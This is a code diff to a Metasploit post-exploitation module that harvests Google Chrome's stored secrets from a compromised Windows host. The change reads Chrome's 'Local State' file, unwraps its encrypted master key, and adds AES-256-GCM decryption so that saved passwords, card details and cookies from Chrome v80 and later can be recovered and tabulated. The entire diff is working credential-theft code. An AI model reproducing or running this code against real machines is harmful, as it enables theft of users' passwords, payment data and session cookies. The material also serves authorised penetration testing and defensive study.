@@ -22,7 +22,8 @@ class MetasploitModule < Msf::Post
           'Sven Taute', #Original (Meterpreter script)
           'sinn3r',     #Metasploit post module
           'Kx499',      #x64 support
-          'mubix'       #Parse extensions
+          'mubix',      #Parse extensions
+          '3ricK5r'     #>v80 aes encrypt password/cookie
         ]
     ))
 
@@ -95,6 +96,24 @@ class MetasploitModule < Msf::Post
     end
   end
 
+  def decrypt_data_aes_256_gcm(data, key)
+    
+    iv = data[3, 12]
+    encrypted_data = data[15, data.length-15]
+    cipher = OpenSSL::Cipher.new('AES-256-GCM')
+    cipher.decrypt
+    cipher.key = key
+    cipher.iv = iv
+    # cipher.padding = 1
+    
+    decrypted = cipher.update(encrypted_data)
+
+    if decrypted.length > 16
+      return decrypted[0, decrypted.length-16]
+    else 
+      return decrypted
+    end
+  end
 
   def decrypt_data(data)
     rg = session.railgun
@@ -126,6 +145,26 @@ class MetasploitModule < Msf::Post
   end
 
   def process_files(username)
+    chrome_key_file_path = @profiles_path + "\\" + username + @key_file_path
+
+    json_content = ''
+    present = session.fs.file.stat(chrome_key_file_path) rescue nil
+    if present
+      file_key = session.fs.file.new(chrome_key_file_path, "rb")
+      until file_key.eof?
+        json_content << file_key.read
+      end
+      file_key.close
+    end
+
+    encrypted_key = JSON.parse(json_content)['os_crypt']['encrypted_key']
+
+    secret_key = nil
+    unless encrypted_key.nil?
+      pureKey = Base64.decode64(encrypted_key)
+      secret_key = decrypt_data(pureKey[5, pureKey.length-5])
+    end
+
     secrets = ""
     decrypt_table = Rex::Text::Table.new(
       "Header"  => "Decrypted data",
@@ -156,7 +195,14 @@ class MetasploitModule < Msf::Post
           item[:encrypted_fields].each do |field|
             name = (res["name_on_card"] == nil) ? res["username_value"] : res["name_on_card"]
             origin = (res["label"] == nil) ? res["origin_url"] : res["label"]
-            pass = res[field + "_decrypted"] = decrypt_data(res[field])
+            
+            pass = ''
+            if secret_key.nil?
+              pass = res[field + "_decrypted"] = decrypt_data(res[field])
+            else
+              pass = res[field + "_decrypted"] = decrypt_data_aes_256_gcm(res[field], secret_key)
+            end
+
             if pass != nil and pass != ""
               decrypt_table << [name, pass, origin]
               secret = "#{name}:#{pass}..... #{origin}"
@@ -286,11 +332,13 @@ class MetasploitModule < Msf::Post
     env_vars = session.sys.config.getenvs('SYSTEMDRIVE', 'USERNAME')
     sysdrive = env_vars['SYSTEMDRIVE'].strip
     if directory?("#{sysdrive}\\Users")
-      @profiles_path = "#{sysdrive}/Users"
+      @profiles_path = "#{sysdrive}\\Users"
       @data_path = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
+      @key_file_path = "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
     elsif directory?("#{sysdrive}\\Documents and Settings")
       @profiles_path = "#{sysdrive}/Documents and Settings"
       @data_path = "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default"
+      @key_file_path = "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Local State"
     end
 
     #Get user(s)
